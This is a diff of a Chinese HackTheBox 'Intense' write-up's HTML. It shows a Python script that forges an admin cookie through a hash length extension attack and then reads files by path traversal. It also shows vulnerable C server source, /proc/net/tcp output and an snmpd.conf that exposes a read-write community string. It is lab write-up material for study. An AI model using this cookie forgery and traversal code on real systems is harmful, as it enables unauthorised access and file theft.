+    old_data,old_sig=r.cookies[&#39;auth&#39;].split(&#39;.&#39;)
+    guest_cred=b64decode(old_data).decode()
+    return b64decode(old_sig).hex()
+
+def crafting_payload():
+    if DEFAULT!=True:          
+        #from scratch
+        admin_name=get_admin_name()
+        admin_hash=get_admin_hash()
+    else:
+        #default
+        admin_name=&quot;admin&quot;
+        admin_hash=&quot;f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105&quot;
+    old_sig = guest_login()
+    old_data=guest_cred
+    payload=&#39;;&#39;+(&quot;;&quot;.join([&quot;username=&quot;+admin_name,&quot;secret=&quot;+admin_hash]))+&quot;;&quot;
+    new_sig=&quot;&quot;
+    for length in range(8,15):
+        res = hashpump(old_sig, old_data, payload,length)
+        cookie=(b64encode(res[1])+b&#39;.&#39;+b64encode(bytes.fromhex(res[0]))).decode()
+        if admin_login(cookie):
+            print(&#39;[*] testing length &#39;+str(length)+&quot; : &quot;)
+            print(&#39;[*] admin_cookie: &#39;+ cookie)
+            return cookie
+    return &quot;[*] Failes getting proper cookie.&quot;
+
+def admin_login(cookie):
+    cookies={&quot;auth&quot;:cookie}
+    r=requests.get(URL+&#39;admin&#39;,cookies=cookies)
+    if r.status_code==403:
+        return False
+    else:
+        return True
+
+def admin_command(option,command):
+    if option not in [&#39;dir&#39;,&#39;view&#39;]:
+        return &quot;Only dir/view supported.&quot;
+    elif option==&#39;dir&#39;:
+        r=requests.post(URL+&#39;admin/log/dir&#39;,data={&#39;logdir&#39;:command},cookies=admin_cookie)
+        return r.text
+    else:
+        r = requests.post(URL + &#39;admin/log/view&#39;, data={&#39;logfile&#39;: &#39;../&#39;+command},cookies=admin_cookie)
+        return r.text
+
+if __name__==&#39;__main__&#39;:
+    if len(sys.argv)==2:
+        if sys.argv[1]==&#39;default&#39;:
+            print(&quot;[*] use default username + password&quot;)
+            DEFAULT=True
+        else:
+            exit(&quot;[*] specify default flag&quot;)
+    else:
+        DEFAULT=False
+    admin_cookie[&#39;auth&#39;]=crafting_payload()
+    terminal().cmdloop()</code></pre>
 <p>效果如图:<br><img src="/2020/07/22/hackthebox-Intense/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>大致功能:跑起来就能得到admin跟hash;爆破出admin的cookie;支持假命令行<code>dir</code>跟<code>view</code>命令分别用来列目录跟读文件。</p>
 <p>这样就能很快在<code>/home/user</code>下找到user.txt读取了。</p>
 <p>小结下。这一部分我觉得难度一般。拿到CTF中倒是挺合适的。不过我觉得这个hash长度扩展以及前面注入时踩的不能用完整的<code>abs()</code>的坑算是给自己一些提醒。</p>
 <h2 id="privesc-to-shell"><a href="#privesc-to-shell" class="headerlink" title="privesc to shell"></a>privesc to shell</h2><p>  接下来这一部分有点玄妙。显然我们现在已经能读文件跟列目录了。但是却没有一个shell.而在user的目录下直接给了一个c的源码提示我们</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_client</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> note[BUFFER_SIZE];</span><br><span class="line">    <span class="keyword">uint16_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> cmd;</span><br><span class="line">    <span class="comment">// copy var</span></span><br><span class="line">    <span class="keyword">uint8_t</span> buf_size;</span><br><span class="line">    <span class="keyword">uint16_t</span> offset;</span><br><span class="line">    <span class="keyword">uint8_t</span> copy_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get command ID</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;cmd, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">            <span class="comment">// write note</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;buf_size, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// prevent user to write over the buffer</span></span><br><span class="line">                <span class="keyword">if</span> (index + buf_size &gt; BUFFER_SIZE) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// write note</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;note[index], buf_size) != buf_size) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                index += buf_size;</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// copy part of note to the end of the note</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="comment">// get offset from user want to copy</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;offset, <span class="number">2</span>) != <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// sanity check: offset must be &gt; 0 and &lt; index</span></span><br><span class="line">                <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt; index) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// get the size of the buffer we want to copy</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">read</span>(sock, &amp;copy_size, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// prevent user to write over the buffer's note</span></span><br><span class="line">                <span class="keyword">if</span> (index &gt; BUFFER_SIZE) &#123;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// copy part of the buffer to the end </span></span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;note[index], &amp;note[offset], copy_size);</span><br><span class="line"></span><br><span class="line">                index += copy_size;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// show note</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">write</span>(sock, note, index);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd, newsockfd, portno;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> clilen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>, <span class="title">cli_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ignore SIGCHLD, prevent zombies */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigchld_action</span> = &#123;</span></span><br><span class="line">        .sa_handler = SIG_DFL,</span><br><span class="line">        .sa_flags = SA_NOCLDWAIT</span><br><span class="line">    &#125;;</span><br><span class="line">    sigaction(SIGCHLD, &amp;sigchld_action, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First call to socket() function */</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sockfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ERROR opening socket"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(<span class="keyword">int</span>)&#123; <span class="number">1</span> &#125;, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">"setsockopt(SO_REUSEADDR) failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize socket structure */</span> </span><br><span class="line">    bzero((<span class="keyword">char</span> *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    portno = <span class="number">5001</span>;</span><br><span class="line"></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">    serv_addr.sin_port = htons(portno);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now bind the host address using bind() call.*/</span></span><br><span class="line">    <span class="keyword">if</span> (bind(sockfd, (struct sockaddr *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ERROR on binding"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">listen</span>(sockfd,<span class="number">5</span>);</span><br><span class="line">    clilen = <span class="keyword">sizeof</span>(cli_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (newsockfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"ERROR on accept"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Create child process */</span></span><br><span class="line">        pid = fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"ERROR on fork"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* This is the client process */</span></span><br><span class="line">            <span class="built_in">close</span>(sockfd);</span><br><span class="line">            handle_client(newsockfd);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">close</span>(newsockfd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="comment">/* end of while */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">// gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server
+
+#include &lt;signal.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+#define BUFFER_SIZE 1024
+
+void handle_client(int sock) {
+    char note[BUFFER_SIZE];
+    uint16_t index = 0;
+    uint8_t cmd;
+    // copy var
+    uint8_t buf_size;
+    uint16_t offset;
+    uint8_t copy_size;
+
+    while (1) {
+
+        // get command ID
+        if (read(sock, &amp;cmd, 1) != 1) {
+            exit(1);
+        }
+
+        switch(cmd) {
+            // write note
+            case 1:
+                if (read(sock, &amp;buf_size, 1) != 1) {
+                    exit(1);
+                }
+
+                // prevent user to write over the buffer
+                if (index + buf_size &gt; BUFFER_SIZE) {
+                    exit(1);
+                }
+
+                // write note
+                if (read(sock, &amp;note[index], buf_size) != buf_size) {
+                    exit(1);
+                }
+
+                index += buf_size;
+
+
+            break;
+
+            // copy part of note to the end of the note
+            case 2:
+                // get offset from user want to copy
+                if (read(sock, &amp;offset, 2) != 2) {
+                    exit(1);
+                }
+
+                // sanity check: offset must be &gt; 0 and &lt; index
+                if (offset &lt; 0 || offset &gt; index) {
+                    exit(1);
+                }
+
+                // get the size of the buffer we want to copy
+                if (read(sock, &amp;copy_size, 1) != 1) {
+                    exit(1);
+                }
+
+                // prevent user to write over the buffer&#39;s note
+                if (index &gt; BUFFER_SIZE) {
+                    exit(1);
+                }
+
+                // copy part of the buffer to the end 
+                memcpy(&amp;note[index], &amp;note[offset], copy_size);
+
+                index += copy_size;
+            break;
+
+            // show note
+            case 3:
+                write(sock, note, index);
+            return;
+
+        }
+    }
+
+
+}
+
+
+
+int main( int argc, char *argv[] ) {
+    int sockfd, newsockfd, portno;
+    unsigned int clilen;
+    struct sockaddr_in serv_addr, cli_addr;
+    int pid;
+
+    /* ignore SIGCHLD, prevent zombies */
+    struct sigaction sigchld_action = {
+        .sa_handler = SIG_DFL,
+        .sa_flags = SA_NOCLDWAIT
+    };
+    sigaction(SIGCHLD, &amp;sigchld_action, NULL);
+
+    /* First call to socket() function */
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (sockfd &lt; 0) {
+        perror(&quot;ERROR opening socket&quot;);
+        exit(1);
+    }
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(int){ 1 }, sizeof(int)) &lt; 0)
+        perror(&quot;setsockopt(SO_REUSEADDR) failed&quot;);
+
+    /* Initialize socket structure */ 
+    bzero((char *) &amp;serv_addr, sizeof(serv_addr));
+    portno = 5001;
+
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);
+    serv_addr.sin_port = htons(portno);
+
+    /* Now bind the host address using bind() call.*/
+    if (bind(sockfd, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr)) &lt; 0) {
+        perror(&quot;ERROR on binding&quot;);
+        exit(1);
+    }
+
+    listen(sockfd,5);
+    clilen = sizeof(cli_addr);
+
+    while (1) {
+        newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen);
+
+        if (newsockfd &lt; 0) {
+            perror(&quot;ERROR on accept&quot;);
+            exit(1);
+        }
+
+        /* Create child process */
+        pid = fork();
+
+        if (pid &lt; 0) {
+            perror(&quot;ERROR on fork&quot;);
+            exit(1);
+        }
+
+        if (pid == 0) {
+            /* This is the client process */
+            close(sockfd);
+            handle_client(newsockfd);
+            exit(0);
+        }
+        else {
+            close(newsockfd);
+        }
+
+    } /* end of while */
+}</code></pre>
 <p>这下我是真懵了。因为看起来就是个pwn题。但比pwn更重要的是,源码中可以看出来它跑在127.0.0.1 5001上。那么我们外网是访问不到的。这里似乎需要一个shell来访问。</p>
 <p>于是继续进行信息收集。首先读了下<code>/proc/net/tcp</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/tcp</span><br><span class="line">sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     </span><br><span class="line">   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 27909 1 0000000000000000 100 0 0 10 0                     </span><br><span class="line">   1: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 24101 1 0000000000000000 100 0 0 10 0                     </span><br><span class="line">   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28936 1 0000000000000000 100 0 0 10 0                     </span><br><span class="line">   3: 0100007F:1389 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25962 1 0000000000000000 100 0 0 10 0                     </span><br><span class="line">   4: C30A0A0A:0050 570E0A0A:B5EE 01 00000000:00000000 00:00000000 00000000    33        0 328478 1 0000000000000000 138 4 30 10 7</span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">/proc/net/tcp
+sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     
+   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 27909 1 0000000000000000 100 0 0 10 0                     
+   1: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 24101 1 0000000000000000 100 0 0 10 0                     
+   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28936 1 0000000000000000 100 0 0 10 0                     
+   3: 0100007F:1389 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25962 1 0000000000000000 100 0 0 10 0                     
+   4: C30A0A0A:0050 570E0A0A:B5EE 01 00000000:00000000 00:00000000 00000000    33        0 328478 1 0000000000000000 138 4 30 10 7              </code></pre>
 <p>这里1389对应的是5001的16进制。并且其uid是0。这说明是root运行,正好符合我们的要求。</p>
 <p>接着突然发现一个/etc/snmp/snmpd.conf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">agentAddress  udp:161</span><br><span class="line"></span><br><span class="line">view   systemonly  included   .1.3.6.1.2.1.1</span><br><span class="line">view   systemonly  included   .1.3.6.1.2.1.25.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> rocommunity public  default    -V systemonly</span><br><span class="line"> rwcommunity SuP3RPrivCom90</span><br><span class="line"></span><br><span class="line">###############################################################################</span><br><span class="line">#</span><br><span class="line">#  SYSTEM INFORMATION</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#  Note that setting these values here, results in the corresponding MIB objects being &#39;read-only&#39;</span><br><span class="line">#  See snmpd.conf(5) for more details</span><br><span class="line">sysLocation    Sitting on the Dock of the Bay</span><br><span class="line">sysContact     Me &lt;user@intense.htb&gt;</span><br><span class="line">                                                 # Application + End-to-End layers</span><br><span class="line">sysServices    72</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  Process Monitoring</span><br><span class="line">#</span><br><span class="line">                               # At least one  &#39;mountd&#39; process</span><br><span class="line">proc  mountd</span><br><span class="line">                               # No more than 4 &#39;ntalkd&#39; processes - 0 is OK</span><br><span class="line">proc  ntalkd    4</span><br><span class="line">                               # At least one &#39;sendmail&#39; process, but no more than 10</span><br><span class="line">proc  sendmail 10 1</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  Disk Monitoring</span><br><span class="line">#</span><br><span class="line">                               # 10MBs required on root disk, 5% free on &#x2F;var, 10% free on all other disks</span><br><span class="line">disk       &#x2F;     10000</span><br><span class="line">disk       &#x2F;var  5%</span><br><span class="line">includeAllDisks  10%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  System Load</span><br><span class="line">#</span><br><span class="line">                               # Unacceptable 1-, 5-, and 15-minute load averages</span><br><span class="line">load   12 10 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###############################################################################</span><br><span class="line">#</span><br><span class="line">#  ACTIVE MONITORING</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">                                    #   send SNMPv1  traps</span><br><span class="line"> trapsink     localhost public</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  Event MIB - automatically generate alerts</span><br><span class="line">#</span><br><span class="line">                                   # Remember to activate the &#39;createUser&#39; lines above</span><br><span class="line">iquerySecName   internalUser</span><br><span class="line">rouser          internalUser</span><br><span class="line">                                   # generate traps on UCD error conditions</span><br><span class="line">defaultMonitors          yes</span><br><span class="line">                                   # generate traps on linkUp&#x2F;Down</span><br><span class="line">linkUpDownNotifications  yes</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#  Arbitrary extension commands</span><br><span class="line">#</span><br><span class="line"> extend    test1   &#x2F;bin&#x2F;echo  Hello, world!</span><br><span class="line"> extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35</span><br><span class="line"></span><br><span class="line"> master          agentx</span><br></pre></td></tr></table></figure>
+<pre><code>agentAddress  udp:161
 
-<p>看到这个udp我就估计不妙，自己探测端口时肯定又忘记扫udp了。而且从这个snmp.conf中可以看到一个关键组<code>SuP3RPrivCom90</code>属于<code>rwcommunity</code>有着读写权限。于是我去搜索了下snmp相关漏洞,发现真的可以达成getshell</p>
+view   systemonly  included   .1.3.6.1.2.1.1
+view   systemonly  included   .1.3.6.1.2.1.25.1
+
+
+ rocommunity public  default    -V systemonly
+ rwcommunity SuP3RPrivCom90
+
+###############################################################################
+#
+#  SYSTEM INFORMATION
+#
+
+#  Note that setting these values here, results in the corresponding MIB objects being &#39;read-only&#39;
+#  See snmpd.conf(5) for more details
+sysLocation    Sitting on the Dock of the Bay
+sysContact     Me &lt;user@intense.htb&gt;
+                                                 # Application + End-to-End layers
+sysServices    72
+
+
+#
+#  Process Monitoring
+#
+                               # At least one  &#39;mountd&#39; process
+proc  mountd
+                               # No more than 4 &#39;ntalkd&#39; processes - 0 is OK
+proc  ntalkd    4
+                               # At least one &#39;sendmail&#39; process, but no more than 10
+proc  sendmail 10 1
+
+#
+#  Disk Monitoring
+#
+                               # 10MBs required on root disk, 5% free on /var, 10% free on all other disks
+disk       /     10000
+disk       /var  5%
+includeAllDisks  10%
+
+
+#
+#  System Load
+#
+                               # Unacceptable 1-, 5-, and 15-minute load averages
+load   12 10 5
+
+
+###############################################################################
+#
+#  ACTIVE MONITORING
+#
+
+                                    #   send SNMPv1  traps
+ trapsink     localhost public
+
+
+#
+#  Event MIB - automatically generate alerts
+#
+                                   # Remember to activate the &#39;createUser&#39; lines above
+iquerySecName   internalUser
+rouser          internalUser
+                                   # generate traps on UCD error conditions
+defaultMonitors          yes
+                                   # generate traps on linkUp/Down
+linkUpDownNotifications  yes
+
+#
+#  Arbitrary extension commands
+#
+ extend    test1   /bin/echo  Hello, world!
+ extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35
+
